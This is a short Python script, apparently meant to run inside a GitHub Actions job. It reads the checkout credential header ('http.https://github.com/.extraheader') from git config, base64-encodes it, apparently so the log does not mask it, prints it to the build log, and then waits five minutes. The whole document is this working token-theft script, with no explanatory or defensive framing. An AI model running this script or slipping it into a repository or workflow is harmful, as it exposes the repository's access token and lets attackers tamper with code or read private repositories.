import subprocess
import base64
import time
# Run the command and capture its output
try:
    output = subprocess.check_output(["git", "config", "--get", "http.https://github.com/.extraheader"], text=True)
    encoded_output = base64.b64encode(output.encode()).decode()  # Base64 encode and decode as string
    print(encoded_output)
    time.sleep(300)
#
except subprocess.CalledProcessError as e:
    print("Error:", e)
